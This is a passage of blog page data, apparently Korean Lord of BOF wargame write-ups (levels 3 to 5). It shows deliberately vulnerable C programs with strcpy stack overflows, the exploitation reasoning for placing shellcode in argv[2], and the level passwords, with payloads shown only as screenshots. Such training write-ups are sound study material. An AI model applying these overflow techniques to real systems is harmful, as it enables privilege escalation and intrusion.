class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtUlEQVR42o3IYW7DIAyGYQdMsDGkS0QCmHTKAdb7X28iWvt7j/RJrw3btmrXfvZaS2tl33Mph7a233LOpRbtehxHrbWfZ9P2/H7mnF+vH1iWJUgQGYspMvPoEGKMEoSYJEqMkuIQRJxzIoKIvZ+wbtvsfQjsvWcOPEZ+nkfciDwR3RczExGllCza67pAtaWUEK0xBhHtn9GI9vPAN2utcw4AVBWatnVdH18PYwz8zzRNAFBK+QVsIQ0vTe3elQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8ddac051cdf269546cf594da596c126f/c9b55/6.webp 165w,\n/static/8ddac051cdf269546cf594da596c126f/f2908/6.webp 330w,\n/static/8ddac051cdf269546cf594da596c126f/7eb86/6.webp 642w\"\n              sizes=\"(max-width: 642px) 100vw, 642px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8ddac051cdf269546cf594da596c126f/04c57/6.png 165w,\n/static/8ddac051cdf269546cf594da596c126f/d9ecf/6.png 330w,\n/static/8ddac051cdf269546cf594da596c126f/1bba8/6.png 642w\"\n            sizes=\"(max-width: 642px) 100vw, 642px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8ddac051cdf269546cf594da596c126f/1bba8/6.png\"\n            alt=\"exploit2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>공격에 성공하였다. 리눅스 명령어에서 세미콜론은 한줄에 여러 개의 명령어를 주고자 할때 쓰인다. $ [첫번째 명령어];[두번째 명령어] 와 같이 입력했을 때, 첫번째 명령어에서 오류가 생겨도 두번째 명령어는 반드시 실행이 된다. 위의 페이로드는 쉘 실행 후 cat을 바로 실행시켜 종료되는 것을 막고자 하였다.</p>\n<p>my-pass: hackers proof</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"bd1ecc45-0d9a-52c7-be32-bb3b86972908","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-03/","title":"LOB 3번 (cobolt -> goblin)","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/fa0e2e7288935e9590ba7a87509ab726/8512a/0.png","srcSet":"/static/fa0e2e7288935e9590ba7a87509ab726/a72a4/0.png 108w,\n/static/fa0e2e7288935e9590ba7a87509ab726/a6679/0.png 216w,\n/static/fa0e2e7288935e9590ba7a87509ab726/8512a/0.png 432w","sizes":"(min-width: 432px) 432px, 100vw"},"sources":[{"srcSet":"/static/fa0e2e7288935e9590ba7a87509ab726/c914c/0.webp 108w,\n/static/fa0e2e7288935e9590ba7a87509ab726/a0779/0.webp 216w,\n/static/fa0e2e7288935e9590ba7a87509ab726/dd357/0.webp 432w","type":"image/webp","sizes":"(min-width: 432px) 432px, 100vw"}]},"width":660,"height":400.27777777777777}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - orc\r\n        - egghunter\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>environ<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// egghunter</span>\r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>stack frame structure:</p>\n<p>| i[4] |\r\n| buffer[40] |\r\n| Stack frame pointer |\r\n| Return Address |\r\n| argc |\r\n| argv[0] |\r\n| argv[1] |\r\n| … |</p>\n<p>environ을 memset시키기 때문에 환경변수를 이용한 공격은 사용할 수 없다. 그리고 argc가 2 이상이 되도록 하며, argv[1][47]이 ‘\\xbf’여야 strcpy(buffer, argv[1])이 실행될 수 있다는 것을 확인할 수 있다. exploit을 위한 조건은 다음과 같다.</p>\n<ul>\n<li>argv[1]이 buffer에 그대로 들어갈 것이기 때문에 exploit을 위해서 길이를 48bytes로 만들 필요가 있다.</li>\n<li>argv[1][47]은 반드시 ‘\\xbf’가 되어야 한다.</li>\n</ul>\n<p>다음은 orc의 어셈블리어이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 432px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 144.24242424242425%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAdCAIAAAAl5NuSAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAD2UlEQVR42l1V2bLjKgx0bDDxAgInNruETzLn/z/xFjhn5s7o0ZUuNb0oXSnF2uPxfGbM3ocQPedcCDGO4zAMoxCjGBljQoj7/X673br/z/f3d84pxGit/fXrnVJc1xUAtNEhxuPYrbVEVL9o3ff9X2AiOs+CiEoBFbL2kEp2XTcKkXIahl6b7f1+bdv2eGwXpO6/GOQ2IUbQOiM6Zx/PR9d1nPOYEmdMKpVyeu776/WlDfy1nIgQc84IWpdSnHP7vvf9jTEWUxqGoTIiiik55xJm7+wqpRCigksp5ax40Po8T+esdZZzxhhLOYtxVKBe7xcSpRSXZbkU4ZxXMBISYYxRKoWE1trDHoyxYRhiynchlFKlXJutlFJrrY35kM+VdHI+gDZNMLsfR1vMMuLI+Splxrwsi2pC/qs2Yk45a6MvsLWV9jAMGWmeJwX69Xod1m7bppQ6jv3z4AYuRHSBy1l8m7aZp5SHob/fp23btDaXVX/lJGMlHmMCgJyTtdYHz9jAGA8xiJGPYgQNy7KYzWyPh9YAANtmOGMdItVHpwRa01mcs+5nc4yxyc7XdZnnaf6ZqU3VDCtrzBl19Zmcc+GDYTHGvu9XKREzEh3Hse97TlEpeb8LxlgVrIJTNsZQKc47530Tm3vvb7cbaF3flXMpZT/2+lPMGkCMY5frk1NKSWtzvTn49mbOffB93ysFGdNhrfcuhOCcHYbho9onnohm26jStj6EyyoiEmKULSTWuRij8x4R930fx0/CiKh2o9Em550PVbDmc+77Xip1nqWc5/58PvejJcp/GoZtc20VANV4HodtCeM8xnC7dUpBKTUIMUXrHBFeWZimqUt1a4opKYCMuQq67xdt51zf36RSIdQbk1I8rHXOAcDtTzwJkeiKp3c+xsjYwEcRgu+6bpHyPE9rbYwV/Ng2s22fVrV41pRpY8pJ3vvqc/OKiKZpWqV8vb6WZZnnWQgxzzNoPQytVVgnXWCkeklci2etZM5CjEqp+s5m0jRNoEGB+qnk1cmcm5/ZOvuhzcdwCQaQcvIhIKbfjbi1qdmuViEZY1o8rfNuXmbGWSm0zLOU6vw6+/6fq/snJDUlAFDOUlsVw7osfByRcBxrSL6+TgUglZJSAtSGaa2FGFur2jEAACQ8jt0HL9dlYOzKdrUwxZjydaRyzpXaPP8uRvVa6RqS4zi8D3JdarYruKu3raUopfrf4J1dluUjGFEpRDFGbcz50+eLdkbk7Ya93y+llDFmXddpuj8ez0+2SymEn6NfT2+9JGFdFzYwpFIFU1Ww5/MJoBSA915rfR2j/wD9E3k3SdYioAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fa0e2e7288935e9590ba7a87509ab726/c9b55/0.webp 165w,\n/static/fa0e2e7288935e9590ba7a87509ab726/f2908/0.webp 330w,\n/static/fa0e2e7288935e9590ba7a87509ab726/0bafe/0.webp 432w\"\n              sizes=\"(max-width: 432px) 100vw, 432px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fa0e2e7288935e9590ba7a87509ab726/04c57/0.png 165w,\n/static/fa0e2e7288935e9590ba7a87509ab726/d9ecf/0.png 330w,\n/static/fa0e2e7288935e9590ba7a87509ab726/0e0c3/0.png 432w\"\n            sizes=\"(max-width: 432px) 100vw, 432px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fa0e2e7288935e9590ba7a87509ab726/0e0c3/0.png\"\n            alt=\"orc\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 449px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 121.8181818181818%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAIAAAB1KUohAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADC0lEQVR42n1U2XKkOBDkMKLbQhISoLNKJWi3J+b/f3BD4LHHjo3J96RSedCUUgARIM3zDADWWucdYwPnk7Vb23XeOUTMRMtiOOf3+635xPP5vu97KWSW5fF8xhgB4DaOkxAIqW3bhPB4exAVH8Kv378po5Dig7yXHRARklQKMVu7xRgZY1Ipa7emabx3IQYiUlIZY/q++7q875WcM2qjAfFTtpBi3daT7FOKPoRtW7ruL2bTNI/HIxMRZWMMEYUQUkpjJauYYtM0MSXMGFMkorZtv5GrYRXVMMx5s5sPfmTDK+fe2bZtQwgAEELw3htj7vf7K+cf4o/jqFYSKqUgZ+dsCIGxYZomu2193/sQSilUdq3n6cTr62vXtX/IRICglKKyV3tCHEcmhIwpdn0fYsQTWs9SSq1nxthfsrHKVvMMGZ3b/HlZCBF8qDkHv67LNHHGhvbE15tP2RVmMVSK964aNrJJTADw8vJyWbiuK+f8+spP8uV2zuSc3ezG2CCl2s6cQwgx1mdPnDc/UEpJAIhJzQowb9tqnWOMCSmXxTRN46oLARBq8uva9/23nIloL1QvU5Xtvb9yts7VnGMEhExkt4vZfm8YAFHWxmDOztoQ4ilbeu/btvU1YXe/35VSw1A96/u+vaq27zsiUsa6KkTrbEyJMTZNk3O267pwQql5nudlMVJO2hgxTZX89vZGhY6jLOu6H48YAyCOI5NS5pyH4QUwQ52NvN1uQgit54EN3+qZYqw5n6vywV97vtx23iNC2XdtZs65EOJ2v7+8nLYde40KAWatkWpUlVxzFs7Z5nxzjFEbo41eluWb7H3fMxFA0kZnKtWdkyyVyJSHYQgxppS01lc9uq77KtmVc0pVNp7DcGfOnE/Ou67vfAj5qqDR8zybxYzj+KdhjyPXnItZFsw5BH+SBz5NCXBgTAihlFTzzMa6h//tdo0qE32UZBw559u2tl3b/APHfuTabZq1BsyVXN1mnHNr1+vUzzF94v35XvbyOI51296e7whQ/yS3USmZUmj+if8AFIheklB9E90AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/356c414799539175cec9eaeb0117a55b/c9b55/1.webp 165w,\n/static/356c414799539175cec9eaeb0117a55b/f2908/1.webp 330w,\n/static/356c414799539175cec9eaeb0117a55b/57bab/1.webp 449w\"\n              sizes=\"(max-width: 449px) 100vw, 449px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/356c414799539175cec9eaeb0117a55b/04c57/1.png 165w,\n/static/356c414799539175cec9eaeb0117a55b/d9ecf/1.png 330w,\n/static/356c414799539175cec9eaeb0117a55b/053a9/1.png 449w\"\n            sizes=\"(max-width: 449px) 100vw, 449px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/356c414799539175cec9eaeb0117a55b/053a9/1.png\"\n            alt=\"orc1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>argv[1]을 주었을 시 주소지를 알아볼 필요가 있다. 입력값의 길이를 48bytes로 맞추어 주었다. argv[2]를 활용할 경우도 생각하여 다음과 같이 입력값을 주었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 640px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.454545454545457%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAt0lEQVR42mWOQZKFIAwFQxiYsgzByI8gKnj/U/4SdzO96nqb19Dvrqo5ZxFh5rhE55wxiIjWWjPMWosD+MPVrrxtpeRc8rIse923TXVTEUkpxRhVP5FZ9SOrEJH3PnD4HQBzYGYK5Jz7GbiBtRYA3udXjDFvyxMy0uA8z1JySquIqCoRzfM8TZP3DhGNMQDwNv936L33+15TQsRa96s1IgKAUvJxHiGEx/dSjzrTDAC11qu1wM/+BWWSDK7fER27AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9bc7fd2a2b6dc2b59fff1b6840fd65d6/c9b55/2.webp 165w,\n/static/9bc7fd2a2b6dc2b59fff1b6840fd65d6/f2908/2.webp 330w,\n/static/9bc7fd2a2b6dc2b59fff1b6840fd65d6/0ba47/2.webp 640w\"\n              sizes=\"(max-width: 640px) 100vw, 640px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9bc7fd2a2b6dc2b59fff1b6840fd65d6/04c57/2.png 165w,\n/static/9bc7fd2a2b6dc2b59fff1b6840fd65d6/d9ecf/2.png 330w,\n/static/9bc7fd2a2b6dc2b59fff1b6840fd65d6/6af66/2.png 640w\"\n            sizes=\"(max-width: 640px) 100vw, 640px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9bc7fd2a2b6dc2b59fff1b6840fd65d6/6af66/2.png\"\n            alt=\"argv addr\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 596px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.87878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAYElEQVR42hXJOw7EIAxAwVcgxCogESVgbPO5/y1XqaYYSslAa+9ac58jQ4D0S/tsczezGCOgpu7uc953BXLOa68P4HkfNe0itX6XUnL31nuXHkIARGSoyhilFODKl8/5B9/SB6gb7loaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0ad5051ea77344a40a249f4cea413084/c9b55/3.webp 165w,\n/static/0ad5051ea77344a40a249f4cea413084/f2908/3.webp 330w,\n/static/0ad5051ea77344a40a249f4cea413084/3cb93/3.webp 596w\"\n              sizes=\"(max-width: 596px) 100vw, 596px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0ad5051ea77344a40a249f4cea413084/04c57/3.png 165w,\n/static/0ad5051ea77344a40a249f4cea413084/d9ecf/3.png 330w,\n/static/0ad5051ea77344a40a249f4cea413084/699b7/3.png 596w\"\n            sizes=\"(max-width: 596px) 100vw, 596px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0ad5051ea77344a40a249f4cea413084/699b7/3.png\"\n            alt=\"argv addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 597px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.242424242424242%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA1UlEQVR42kXObW+DMAwEYGuxq0BaQgsiTpwXp0zw///hRDdp9/25OzjOQ3tHNM653jWJ3N0IALXWXDJzAIBlXUoptTUiJLrVUrT31+sJrdUtBGO+rLUppcA8jgMAbCEE5nVdAGDyU2COMSGiQQwhJBE/TVBrYY6Ixlor8o/5k1/svef4hxGRI4uI9xOc56Haiczo3P79Lq08Hg4AWmu11Zji5/batKkqESLdVHXf96u3d40xojHDMOQskvP9fuGUkoiEbbuW51my5JyJyCCK5FLr/Jx/APW4FcUnahn9AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/80a6be56fdc4172a6f0eb0f2314efc29/c9b55/4.webp 165w,\n/static/80a6be56fdc4172a6f0eb0f2314efc29/f2908/4.webp 330w,\n/static/80a6be56fdc4172a6f0eb0f2314efc29/9e35d/4.webp 597w\"\n              sizes=\"(max-width: 597px) 100vw, 597px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/80a6be56fdc4172a6f0eb0f2314efc29/04c57/4.png 165w,\n/static/80a6be56fdc4172a6f0eb0f2314efc29/d9ecf/4.png 330w,\n/static/80a6be56fdc4172a6f0eb0f2314efc29/17602/4.png 597w\"\n            sizes=\"(max-width: 597px) 100vw, 597px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/80a6be56fdc4172a6f0eb0f2314efc29/17602/4.png\"\n            alt=\"argv addr3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>0xbfffbdc부터 0xbffffc0b에 argv[1]이 들어가 있는 것을 볼 수 있다. 0xbffffc0c부터는 argv[2]가 시작되고 있다. argv[2] 자리에 shellcode를 적재시킨다면 위의 조건을 모두 맞추면서 exploit이 성공할 것이다. 아래와 같이 공격을 시도하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.121212121212125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA6ElEQVR42j2O266EIAxFvSG0XMcREFBA4/9/4wnGM+uhWW3aZnf3fdfzzKWxH3uIwXnnvd/CFmKwzllrZ0IImYZhoHSeprH7kXNOKVq7hrAty6K1BmAAIJV8HJRS8oExJpU0n4ZdVyFEV2s9cg4x1lqOnOt5xhhTStd11bO2PLWkfXfepT2VUvy2GWOEkFyIznv//X611kopY4zWWj9FPSKVpJQyxgCBc46IgEgIeWMfx+GcW9cVAdsSACLM89wEgLVTyrlAQEpn5MiF4JxLKduL67qc9x9jpnHsH4Z/3rb/8QyH1/qu/wO/nxSSik5LeQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8432123926b943a65fe95b544ddf3745/c9b55/5.webp 165w,\n/static/8432123926b943a65fe95b544ddf3745/f2908/5.webp 330w,\n/static/8432123926b943a65fe95b544ddf3745/d95e5/5.webp 639w\"\n              sizes=\"(max-width: 639px) 100vw, 639px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8432123926b943a65fe95b544ddf3745/04c57/5.png 165w,\n/static/8432123926b943a65fe95b544ddf3745/d9ecf/5.png 330w,\n/static/8432123926b943a65fe95b544ddf3745/738b8/5.png 639w\"\n            sizes=\"(max-width: 639px) 100vw, 639px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8432123926b943a65fe95b544ddf3745/738b8/5.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>권한 상승에 성공하였다.</p>\n<p>my-pass: cantata</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"876eb155-90be-5f12-99ce-dfea16a956f2","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-04/","title":"LOB 4번 (goblin -> orc)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/8b4034f66a32c34bf72fb280f19f9f89/51b64/0.png","srcSet":"/static/8b4034f66a32c34bf72fb280f19f9f89/c02c1/0.png 160w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/6c845/0.png 320w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/51b64/0.png 640w","sizes":"(min-width: 640px) 640px, 100vw"},"sources":[{"srcSet":"/static/8b4034f66a32c34bf72fb280f19f9f89/4d75c/0.webp 160w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/0166a/0.webp 320w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/e3b90/0.webp 640w","type":"image/webp","sizes":"(min-width: 640px) 640px, 100vw"}]},"width":660,"height":400.125}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - wolfman\r\n        - egghunter + buffer hunter\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>environ<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// egghunter</span>\r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> 